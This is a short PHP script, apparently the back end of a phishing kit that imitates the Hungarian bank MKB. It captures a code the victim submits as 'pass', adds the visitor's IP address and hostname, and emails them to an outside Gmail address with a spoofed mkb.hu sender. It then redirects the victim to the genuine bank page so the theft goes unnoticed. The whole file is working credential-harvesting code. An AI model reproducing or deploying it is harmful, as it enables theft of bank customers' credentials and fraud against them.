<?
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg .= "\n";
$msg .= "CodE : ".$_POST['pass']."\n";
$msg .= "\n";
$msg .= "IP: ".$ip."\n";
$msg .= "HostName : ".$hostname."\n";
$msg .= "\n";
$msg .= "------------Built By HustleLogic----------------\n";
$post = "@gmail.com";
$subj = "MKB Code - ".$_POST['pass']."\n";
$from = "From: $ip<swipe@mkb.hu>";
mail("$post",$subj, $msg, $from); 
header("Location: https://www.mkb.hu/megujulas-nyito");  	  

?>


